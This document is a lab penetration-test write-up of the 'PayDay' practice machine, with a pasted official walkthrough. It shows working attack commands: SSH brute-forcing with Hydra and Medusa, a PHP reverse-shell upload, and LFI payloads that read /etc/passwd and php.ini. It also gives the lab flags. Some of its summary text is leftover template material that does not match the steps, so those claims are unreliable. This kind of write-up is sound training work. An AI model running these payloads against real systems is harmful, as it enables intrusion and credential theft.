# PayDay
## Table of Contents
* [Executive Summary](#executive-summary)
  * [Attack Vectors](#attack-vectors)
  * [Recommendations](#recommendations)
* [Methodology](#methodology)
  * [Reconnaissance](#reconnaissance)
  * [Enumeration](#enumeration)
  * [Gaining Access](#gaining-access)
  * [Maintaining Access](#maintaining-access)
  * [Covering Tracks](#covering-tracks)
* [Additional Items](#additional-items)

# Executive Summary
On 1 August 2021, Victor Fernandez III performed a penetration test of the Offensive Security exam network. This report includes detailed information about the vulnerabilities he discovered as well as recommendations for mitigating each of them. This report also contains an outline of the methodolgy he used to enumerate and exploit the THINC.local domain. During the penetration test, Victor was able to gain administrator-level access to multiple computers, primarly due to out-of-date and/or misconfigured software. A brief description of each computer compromised is listed below.

## Attack Vectors
| Vulnerabilities | Exploits |
| --- | ---| 
| CVE-2016-5195 | |
| | EDB-ID-48891 |

## Recommendations
Victor recommends patching the vulnerabilities he identified to mitigate the risk of exploitation and/or unauthorized access to Offensive Security information systems. One thing to remember is that these systems require frequent patching and once patched, should remain on a regular patch program to protect additional vulnerabilities that are discovered at a later date.

# Methodology
Victor used a widely-adopted and phased approach for the penetration test. This included reconnaissance, enumeration, gaining access, maintaining access, and covering his tracks. Below is an outline of Victor's activities and serves to demonstrate how he identified and exploited a variety of information systems across the Offensive Security exam network.

## Reconnaissance
The purpose of the reconnaissance phase of a penetration test is to identify information and sytems that represent the organization online and then, discover possible attack vectors. For this penetration test, Victor was asked to narrow his information gathering objectives to collecting the details below. 

### General Information
* Hostname: payday
* Description: Things normally go smooth on payday.
* IP Address: 192.168.142.39
* MAC Address: (ref:) 
* Domain: WORKGROUP
* Distro: (ref:)
* Kernel: Linux 2.6.22-14-server (ref: phpinfo)
* Architecture: (ref:)

### Ports
```bash
# Nmap 7.91 scan initiated Sat Jul 10 17:51:01 2021 as: nmap -sS -sU -p- --min-rate 1000 -oN scans/payday-nmap-complete 192.168.142.39
Warning: 192.168.142.39 giving up on port because retransmission cap hit (10).
Nmap scan report for 192.168.142.39
Host is up (0.087s latency).
Not shown: 66255 closed ports, 64807 open|filtered ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
110/tcp open  pop3
139/tcp open  netbios-ssn
143/tcp open  imap
445/tcp open  microsoft-ds
993/tcp open  imaps
995/tcp open  pop3s

# Nmap done at Sat Jul 10 18:03:58 2021 -- 1 IP address (1 host up) scanned in 777.79 seconds
```

### Service Versions
```bash
# Nmap 7.91 scan initiated Sat Jul 10 18:05:40 2021 as: nmap -sV -sC -pT:22,80,110,139,143,445,993,995 -oN scans/payday-nmap-versions 192.168.142.39
Nmap scan report for 192.168.142.39
Host is up (0.078s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 4.6p1 Debian 5build1 (protocol 2.0)
| ssh-hostkey: 
|   1024 f3:6e:87:04:ea:2d:b3:60:ff:42:ad:26:67:17:94:d5 (DSA)
|_  2048 bb:03:ce:ed:13:f1:9a:9e:36:03:e2:af:ca:b2:35:04 (RSA)
80/tcp  open  http        Apache httpd 2.2.4 ((Ubuntu) PHP/5.2.3-1ubuntu6)
|_http-server-header: Apache/2.2.4 (Ubuntu) PHP/5.2.3-1ubuntu6
|_http-title: CS-Cart. Powerful PHP shopping cart software
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: CAPA RESP-CODES UIDL STLS SASL PIPELINING TOP
|_ssl-date: 2021-07-10T22:06:11+00:00; +6s from scanner time.
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|_    SSL2_RC2_128_CBC_WITH_MD5
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: MSHOME)
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: STARTTLS completed Capability THREAD=REFERENCES MULTIAPPEND OK NAMESPACE IDLE LOGINDISABLEDA0001 CHILDREN LOGIN-REFERRALS LITERAL+ IMAP4rev1 UNSELECT SASL-IR SORT
|_ssl-date: 2021-07-10T22:06:11+00:00; +6s from scanner time.
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|_    SSL2_RC2_128_CBC_WITH_MD5
445/tcp open  netbios-ssn Samba smbd 3.0.26a (workgroup: MSHOME)
993/tcp open  ssl/imaps?
| ssl-cert: Subject: commonName=ubuntu01/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
| Not valid before: 2008-04-25T02:02:48
|_Not valid after:  2008-05-25T02:02:48
|_ssl-date: 2021-07-10T22:06:10+00:00; +6s from scanner time.
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|_    SSL2_RC2_128_CBC_WITH_MD5
995/tcp open  ssl/pop3s?
| ssl-cert: Subject: commonName=ubuntu01/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
| Not valid before: 2008-04-25T02:02:48
|_Not valid after:  2008-05-25T02:02:48
|_ssl-date: 2021-07-10T22:06:10+00:00; +6s from scanner time.
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|_    SSL2_RC2_128_CBC_WITH_MD5
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 40m05s, deviation: 1h37m58s, median: 5s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.26a)
|   Computer name: payday
|   NetBIOS computer name: 
|   Domain name: 
|   FQDN: payday
|_  System time: 2021-07-10T18:05:58-04:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jul 10 18:06:07 2021 -- 1 IP address (1 host up) scanned in 27.11 seconds
```

### Operating System
```bash
victor@kali:~/oscp/pg/labs/payday$ cat scans/payday-nmap-os
# Nmap 7.91 scan initiated Sat Jul 10 18:07:53 2021 as: nmap -O -oN scans/payday-nmap-os 192.168.142.39
Nmap scan report for 192.168.142.39
Host is up (0.076s latency).
Not shown: 992 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
110/tcp open  pop3
139/tcp open  netbios-ssn
143/tcp open  imap
445/tcp open  microsoft-ds
993/tcp open  imaps
995/tcp open  pop3s
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=7/10%OT=22%CT=1%CU=34968%PV=Y%DS=2%DC=I%G=Y%TM=60EA1A4
OS:C%P=x86_64-pc-linux-gnu)SEQ(SP=D5%GCD=1%ISR=EF%TI=Z%II=I%TS=7)SEQ(SP=EC%
OS:GCD=1%ISR=EC%TI=Z%TS=7)OPS(O1=M506ST11NW5%O2=M506ST11NW5%O3=M506NNT11NW5
OS:%O4=M506ST11NW5%O5=M506ST11NW5%O6=M506ST11)WIN(W1=16A0%W2=16A0%W3=16A0%W
OS:4=16A0%W5=16A0%W6=16A0)ECN(R=Y%DF=Y%T=40%W=16D0%O=M506NNSNW5%CC=N%Q=)T1(
OS:R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y%T=4
OS:0%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=N)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN
OS:=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops

OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jul 10 18:08:12 2021 -- 1 IP address (1 host up) scanned in 18.78 seconds
```

## Enumeration
The service enumeration portion of a penetration test focuses on gathering information about what services are alive on a system or systems. This is valuable for an attacker as it provides detailed information on potential attack vectors into a system. Understanding what applications are running on the system gives an attacker needed information before performing the actual penetration test. In some cases, some ports may not be listed.

### SSH
```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt  ssh://10.11.12.13
```

### HTTP

Victor was able to discover the hidden directories below using Dirb.
```bash
dirb http://$TARGET:80 /usr/share/wordlists/dirb/big.txt -z10 -o scans/$NAME-dirb-big-80

# output
NSTR
```

Victor was able to discover the hidden directories below using Dirsearch.
```bash
dirsearch -u $TARGET:$PORT -o $FULLPATH/$NAME-dirsearch-80
# replace the lines above with the actual scan results
```

Victor was able to identify the following HTTP server misconfigurations using Nikto.
```bash
nikto -h $TARGET -p $PORT -T 2 -Format txt -o scans/$NAME-nikto-misconfig-80

# output
NSTR
```

### RPC
```bash
rpcclient -U '' $TARGET
```
```
srvinfo

# output
        PAYDAY         Wk Sv PrQ Unx NT SNT payday server (Samba, Ubuntu)
        platform_id     :       500
        os version      :       4.9
        server type     :       0x809a03
```
```bash
netshareenum

# output
NSTR
```

### NetBIOS
```bash
nbtscan $TARGET

# output
Doing NBT name scan for addresses from 192.168.142.39

IP address       NetBIOS Name     Server    User             MAC address      
------------------------------------------------------------------------------
```

### SMB
The following SMB shares were discovered using Smbclient.
```bash
smbclient -L $TARGET

# output
Enter WORKGROUP\victor's password: 
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (payday server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.
Anonymous login successful

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        MSHOME   
```

The SMB shares discovered have the following permissions.
```bash
smbmap -H $TARGET

# output
[+] IP: 192.168.142.39:445      Name: 192.168.142.39                                    
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        IPC$   
```

## Gaining Access
The penetration testing portions of the assessment focus heavily on gaining access to a variety of systems. During this penetration test, Victor was able to successfully gain access to 10 out of the 50 systems.

### Password Guessing  
#### Default Credentials
```bash
firefox http://$TARGET:$PORT
# CS-Cart. Powerful PHP shopping cart software
# admin:admin
```

## Local File Inclusion
### EDB-ID-48891
```bash
mkdir edb-id-48891
cp /usr/share/webshells/php/php-reverse-shell.php ./rshell.phtml
vim rshell.phtml

# upload rshell as a skin
firefox http://192.168.142.39/admin.php?target=template_editor

sudo nc -nvlp 80
firefox http://192.168.142.39/skins/rshell.phtml

cat /etc/passwd
su patrick # patrick:patrick
sudo -l
sudo su
cat /root/proof.txt
```

### CVE-2016-5195
```bash
Linux Kernel 2.6.22 - IPv6 Hop-By-Hop Header Remote Denial of Service                                | linux/dos/30902.c
Linux Kernel 2.6.22 < 3.9 (x86/x64) - 'Dirty COW /proc/self/mem' Race Condition Privilege Escalation | linux/local/40616.c
Linux Kernel 2.6.22 < 3.9 - 'Dirty COW /proc/self/mem' Race Condition Privilege Escalation (/etc/pas | linux/local/40847.cpp
Linux Kernel 2.6.22 < 3.9 - 'Dirty COW PTRACE_POKEDATA' Race Condition (Write Access Method)         | linux/local/40838.c
Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privilege Escalation (/etc/ | linux/local/40839.c
Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' /proc/self/mem Race Condition (Write Access Method)          | linux/local/40611.c
```

## Maintaining Access
Maintaining access to a system is important to us as attackers, ensuring that we can get back into a system after it has been exploited is invaluable. The maintaining access phase of the penetration test focuses on ensuring that once the focused attack has occurred (i.e. a buffer overflow), we have administrative access over the system again. Many exploits may only be exploitable once and we may never be able to get back into a system after we have already per-formed the exploit. Victor added administrator and root level accounts on all systems compromised. In addition to the administrative/root access, a Metasploit meterpreter service was installed on the machine to en-sure that additional access could be established.

## Covering Tracks
The house cleaning portions of the assessment ensures that remnants of the penetration test are removed. Often fragments of tools or user accounts are left on an organizations computer which can cause security issues down the road. Ensuring that we are meticulous and no remnants of our penetration test are left over is important. After the trophies on both the lab network and exam network were completed, Victor removed all user accounts and passwords as well as the Meterpreter services installed on the system. Offensive Security should not have to remove any user accounts or services from the system.

# Additional Items
## Tools Used
* nmap
* dirb
* python
* php-reverse-shell
* sudo

## Hints
* Look at what is running on port 80. Can you find the version? It is also worth brute-forcing directories.
* There is an LFI present. You need to include an important file for vital information. Then, either guess or brute-force your way in.
* Check your sudo permissions.

## Flags
* local.txt = 446e3816f27462648d36f45fac7b2ab3
* proof.txt = b17f98f50c2e2c460f3d092a48559cd2

## Official Walkthrough
```bash
Exploitation Guide for PayDay
Summary
PayDay has an outdated version of CS Cart installed, which is vulnerable to a Local File Inclusion vulnerability. The LFI can be used to view the /etc/passwd file, which leaks an important username. The username can then be used to conduct a brute-force for the user’s password for the SSH service.

Enumeration
Nmap
We start off by running an nmap scan:

kali@kali:~$ sudo nmap -p- 192.168.120.85
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-24 13:39 EDT
Nmap scan report for 192.168.120.85
Host is up (0.032s latency).
Not shown: 65527 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
110/tcp open  pop3
139/tcp open  netbios-ssn
143/tcp open  imap
445/tcp open  microsoft-ds
993/tcp open  imaps
995/tcp open  pop3s

Nmap done: 1 IP address (1 host up) scanned in 45.15 seconds

kali@kali:~$ sudo nmap -A -sV -p 22,80,110,139,143,445,993,995 192.168.120.85
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-24 13:41 EDT
Nmap scan report for 192.168.120.85
Host is up (0.033s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 4.6p1 Debian 5build1 (protocol 2.0)
| ssh-hostkey: 
|   1024 f3:6e:87:04:ea:2d:b3:60:ff:42:ad:26:67:17:94:d5 (DSA)
|_  2048 bb:03:ce:ed:13:f1:9a:9e:36:03:e2:af:ca:b2:35:04 (RSA)
80/tcp  open  http        Apache httpd 2.2.4 ((Ubuntu) PHP/5.2.3-1ubuntu6)
|_http-server-header: Apache/2.2.4 (Ubuntu) PHP/5.2.3-1ubuntu6
|_http-title: CS-Cart. Powerful PHP shopping cart software
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: PIPELINING STLS TOP SASL UIDL CAPA RESP-CODES
|_ssl-date: 2020-03-24T17:41:53+00:00; +11s from scanner time.
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|_    SSL2_DES_192_EDE3_CBC_WITH_MD5
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: MSHOME)
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: IDLE LOGIN-REFERRALS SORT Capability MULTIAPPEND LITERAL+ SASL-IR OK NAMESPACE UNSELECT CHILDREN LOGINDISABLEDA0001 STARTTLS IMAP4rev1 completed THREAD=REFERENCES
|_ssl-date: 2020-03-24T17:41:53+00:00; +11s from scanner time.
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|_    SSL2_DES_192_EDE3_CBC_WITH_MD5
445/tcp open  netbios-ssn Samba smbd 3.0.26a (workgroup: MSHOME)
993/tcp open  ssl/imaps?
|_ssl-date: 2020-03-24T17:41:53+00:00; +11s from scanner time.
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|_    SSL2_DES_192_EDE3_CBC_WITH_MD5
995/tcp open  ssl/pop3s?
|_ssl-date: 2020-03-24T17:41:53+00:00; +11s from scanner time.
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|_    SSL2_DES_192_EDE3_CBC_WITH_MD5
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: WAP|general purpose|switch|specialized|media device
Running (JUST GUESSING): Linux 2.4.X|2.6.X (94%), AVM embedded (93%), Extreme Networks ExtremeXOS 12.X|15.X (93%), Google embedded (93%), HP embedded (93%), Philips embedded (93%)
OS CPE: cpe:/o:linux:linux_kernel:2.4.20 cpe:/o:linux:linux_kernel:2.6.34 cpe:/h:avm:fritz%21box_fon_wlan_7170 cpe:/o:extremenetworks:extremexos:12.5.4 cpe:/o:extremenetworks:extremexos:15.3 cpe:/o:linux:linux_kernel:2.4.21
Aggressive OS guesses: Tomato 1.27 - 1.28 (Linux 2.4.20) (94%), DD-WRT v24-presp2 (Linux 2.6.34) (94%), Linux 2.6.22 (94%), Linux 2.6.18 - 2.6.22 (94%), AVM FRITZ!Box FON WLAN 7170 WAP (93%), Extreme Networks ExtremeXOS 12.5.4 (93%), Extreme Networks ExtremeXOS 15.3 (93%), Google Mini search appliance (93%), HP Brocade 4Gb SAN switch or (93%), Linux 2.4.20 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 40m10s, deviation: 1h37m58s, median: 10s
|_nbstat: NetBIOS name: PAYDAY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.26a)
|   Computer name: payday
|   NetBIOS computer name: 
|   Domain name: 
|   FQDN: payday
|_  System time: 2020-03-24T13:41:40-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   34.83 ms 192.168.118.1
2   35.63 ms 192.168.120.85

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 165.51 seconds
Web Enumeration
The web server is running a vulnerable version of CS-Cart application on port 80:



kali@kali:~$ curl -s http://192.168.120.85/ | head
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>

<head>
<title>CS-Cart. Powerful PHP shopping cart software</title>
<meta http-equiv="content-type" content="text/html; charset=iso-8859-1">
<meta name="description" content="The powerful shopping cart software for web stores and e-commerce enabled webstores is based on PHP / PHP4 with MySQL database with highly configurable implementation base on templates.">
<meta name="keywords" content="cs-cart, cscart, shopping cart, cart, online shop software, e-shop, e-commerce, store, php, php4, mysql, web store, gift certificates, wish list, best sellers">
<link href="/skins/new_vision_blue/customer/styles.css" rel="stylesheet" type="text/css">
<link href="/skins/new_vision_blue/customer/js_menu/theme.css" type="text/css" rel="stylesheet">
kali@kali:~$
Looking up “CS-Cart” in EDB points to https://www.exploit-db.com/exploits/14962 as one of the entries that deals with the /install.php installation file. The entry states the following:

If "install.php" was not removed after installation simply make an html file with the following code and replace <Victim Server> by the PATH to "install.php" example:"http://www.nonexistant.com/install.php":
With this information, we can enumerate the version of the application to reveal version 1.3.6:

kali@kali:~$ curl -s http://192.168.120.85/install.php | grep -i version
                        <td valign="bottom"><p style="font-weight: bold; font-size: 11px;">Version:&nbsp;1.3.3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p></td>
kali@kali:~$
Searchsploit reveals the “CS-Cart 1.3.3 - ‘classes_dir’ Remote File Inclusion” vulnerability:

kali@kali:~$ searchsploit "cs-cart"
------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                           |  Path
                                                                         | (/usr/share/exploitdb/)
------------------------------------------------------------------------- ----------------------------------------
CS-Cart - Multiple SQL Injections                                        | exploits/php/webapps/27030.txt
CS-Cart 1.3.2 - 'index.php' Cross-Site Scripting                         | exploits/php/webapps/31443.txt
CS-Cart 1.3.3 - 'classes_dir' Remote File Inclusion                      | exploits/php/webapps/1872.txt
CS-Cart 1.3.3 - 'install.php' Cross-Site Scripting                       | exploits/multiple/webapps/14962.txt
CS-Cart 1.3.5 - Authentication Bypass                                    | exploits/php/webapps/6352.txt
CS-Cart 2.0.0 Beta 3 - 'Product_ID' SQL Injection                        | exploits/php/webapps/8184.txt
CS-Cart 2.0.5 - 'reward_points.post.php' SQL Injection                   | exploits/php/webapps/33146.txt
CS-Cart 2.2.1 - 'products.php' SQL Injection                             | exploits/php/webapps/36093.txt
CS-Cart 4.2.4 - Cross-Site Request Forgery                               | exploits/php/webapps/36358.html
CS-Cart 4.3.10 - XML External Entity Injection                           | exploits/php/webapps/40770.txt
------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
kali@kali:~$ file /usr/share/exploitdb/exploits/php/webapps/1872.txt
/usr/share/exploitdb/exploits/php/webapps/1872.txt: ASCII text, with CRLF line terminators
kali@kali:~$

Furthermore, dirb finds the /classes/ directory:

kali@kali:~$ dirb http://192.168.120.85/

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed Mar 25 08:35:38 2020
URL_BASE: http://192.168.120.85/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.120.85/ ----
==> DIRECTORY: http://192.168.120.85/addons/                                                                     
+ http://192.168.120.85/admin (CODE:200|SIZE:9471)                                                               
+ http://192.168.120.85/admin.php (CODE:200|SIZE:9471)                                                           
==> DIRECTORY: http://192.168.120.85/catalog/                                                                    
+ http://192.168.120.85/cgi-bin/ (CODE:403|SIZE:308)                                                             
+ http://192.168.120.85/chart (CODE:200|SIZE:0)                                                                  
==> DIRECTORY: http://192.168.120.85/classes/                                                                    
+ http://192.168.120.85/config (CODE:200|SIZE:13)                                                                
==> DIRECTORY: http://192.168.120.85/core/                                                                       
+ http://192.168.120.85/image (CODE:200|SIZE:1971)                                                               
==> DIRECTORY: http://192.168.120.85/images/                                                                     
==> DIRECTORY: http://192.168.120.85/include/                                                                    
+ http://192.168.120.85/index (CODE:200|SIZE:28074)                                                              
+ http://192.168.120.85/index.php (CODE:200|SIZE:28074)                                                          
+ http://192.168.120.85/init (CODE:200|SIZE:13)                                                                  
+ http://192.168.120.85/install (CODE:200|SIZE:7731)                                                             
==> DIRECTORY: http://192.168.120.85/payments/                                                                   
+ http://192.168.120.85/prepare (CODE:200|SIZE:0)                                                                
+ http://192.168.120.85/server-status (CODE:403|SIZE:313)                                                        
==> DIRECTORY: http://192.168.120.85/skins/                                                                      
+ http://192.168.120.85/store_closed (CODE:200|SIZE:575)                                                         
+ http://192.168.120.85/Thumbs.db (CODE:200|SIZE:1)                                                              
==> DIRECTORY: http://192.168.120.85/var/
Looking into that directory (http://192.168.120.85/classes/fckeditor/_whatsnew.html), we see a version 2.2 of FCKeditor. FCKeditor (which later got renamed to CKEditor), is a common third party library that contains various vulnerabilities. This application is vulnerable to https://www.exploit-db.com/exploits/17644 (arbitrary file upload) and https://www.exploit-db.com/exploits/1964/ (remote code execution) with some alterations.

kali@kali:~$ searchsploit fckeditor core
------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                           |  Path
                                                                         | (/usr/share/exploitdb/)
------------------------------------------------------------------------- ----------------------------------------
FCKEditor Core - 'Editor 'spellchecker.php' Cross-Site Scripting         | exploits/php/webapps/37457.html
FCKEditor Core - 'FileManager test.html' Arbitrary File Upload (1)       | exploits/php/webapps/12254.txt
FCKEditor Core - 'FileManager test.html' Arbitrary File Upload (2)       | exploits/php/webapps/17644.txt
FCKEditor Core 2.x 2.4.3 - 'FileManager upload.php' Arbitrary File Uploa | exploits/php/webapps/15484.txt
FCKEditor Core ASP 2.6.8 - Arbitrary File Upload Protection Bypass       | exploits/asp/webapps/23005.txt
------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
kali@kali:~$ file /usr/share/exploitdb/exploits/php/webapps/17644.txt
/usr/share/exploitdb/exploits/php/webapps/17644.txt: ASCII text, with CRLF line terminators
kali@kali:~$
Exploitation
CS-Cart Local File Inclusion Vulnerability
The vulnerability in question is https://www.exploit-db.com/exploits/1872/, and it can be exploited as follows:

kali@kali:~$ curl 'http://192.168.120.85/classes/phpmailer/class.cs_phpmailer.php?classes_dir=/etc/passwd%00'
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
dhcp:x:100:101::/nonexistent:/bin/false
syslog:x:101:102::/home/syslog:/bin/false
klog:x:102:103::/home/klog:/bin/false
mysql:x:103:107:MySQL Server,,,:/var/lib/mysql:/bin/false
dovecot:x:104:111:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false
postfix:x:105:112::/var/spool/postfix:/bin/false
sshd:x:106:65534::/var/run/sshd:/usr/sbin/nologin
patrick:x:1000:1000:patrick,,,:/home/patrick:/bin/bash
<br />
<b>Fatal error</b>:  Class 'PHPMailer' not found in <b>/var/www/classes/phpmailer/class.cs_phpmailer.php</b> on line <b>6</b><br />
kali@kali:~$
Note that remote file inclusions will not work in this case. By using base64, we can read any file on the system (otherwise it would execute all *.php files). The improved proof of concept is as follows:

kali@kali:~$ curl -s 'http://192.168.120.85/classes/phpmailer/class.cs_phpmailer.php?classes_dir=php://filter/read=convert.base64-encode/resource=/etc/php5/apache2/php.ini%00'| base64 -d 2>/dev/null
[PHP]

;;;;;;;;;;;
; WARNING ;
;;;;;;;;;;;
; This is the default settings file for new PHP installations.
; By default, PHP installs itself with a configuration suitable for
; development purposes, and *NOT* for production purposes.
; For several security-oriented considerations that should be taken
; before going online with your site, please consult php.ini-recommended
; and http://php.net/manual/en/security.php.


;;;;;;;;;;;;;;;;;;;
; About php.ini   ;
;;;;;;;;;;;;;;;;;;;

...
Now we can see that allow_url_include is disabled, not allowing us to perform RFI attacks. From the retrieved passwd file, we will note the following user:

patrick:x:1000:1000:patrick,,,:/home/patrick:/bin/bash
SSH via Guessing
We can guess the Patrick’s password to be patrick and simply SSH into the machine (alternatively the auxiliary metasploit module use auxiliary/scanner/ssh/ssh_login or Hydra can be used to brute-force the SSH authentication).

kali@kali:~$ ssh patrick@192.168.120.85
The authenticity of host '192.168.120.85 (192.168.120.85)' can't be established.
RSA key fingerprint is SHA256:4cNPcDOXrXdUvuqlTmFzow0HNSvJ1pXoNPKTZViNTYA.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.120.85' (RSA) to the list of known hosts.
patrick@192.168.120.85's password: 
Linux payday 2.6.22-14-server #1 SMP Sun Oct 14 23:34:23 GMT 2007 i686

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.
patrick@payday:~$ id
uid=1000(patrick) gid=1000(patrick) groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),104(scanner),115(lpadmin),1000(patrick)
patrick@payday:~$
kali@kali:~$ echo patrick > users.txt
SSH Password Bruteforce Using Hydra
kali@kali:~$ hydra -L users.txt -P users.txt -e nsr -q ssh://192.168.120.85 -t 4 -w 5 -f
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-03-25 09:00:39
[DATA] max 4 tasks per 1 server, overall 4 tasks, 4 login tries (l:1/p:4), ~1 try per task
[DATA] attacking ssh://192.168.120.85:22/
[22][ssh] host: 192.168.120.85   login: patrick   password: patrick
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-03-25 09:00:40
kali@kali:~$
SSH Password Bruteforce Using Medusa
kali@kali:~$ medusa -h 192.168.120.85 -U users.txt -P users.txt -M ssh -e ns -f -g 5 -r 0 -b -t 2 -v 4
